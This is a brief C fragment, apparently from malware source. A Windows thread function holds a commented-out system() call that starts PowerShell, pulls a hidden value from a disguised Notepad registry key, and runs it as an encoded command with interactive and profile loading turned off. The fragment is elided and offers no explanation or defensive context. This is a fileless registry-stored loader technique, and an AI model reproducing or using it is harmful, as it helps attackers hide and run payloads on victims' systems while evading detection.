...
DWORD WINAPI YahSure(LPVOID lpParameter)
{
	...
	//system("C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -c $x=((gp HKLM:SOFTWARE\\Microsoft\\Notepad debug).debug); \
			   		   		   		   	if ($x) { powershell -nonI -nopro -enc $x } Else {exit}");
	return 1;
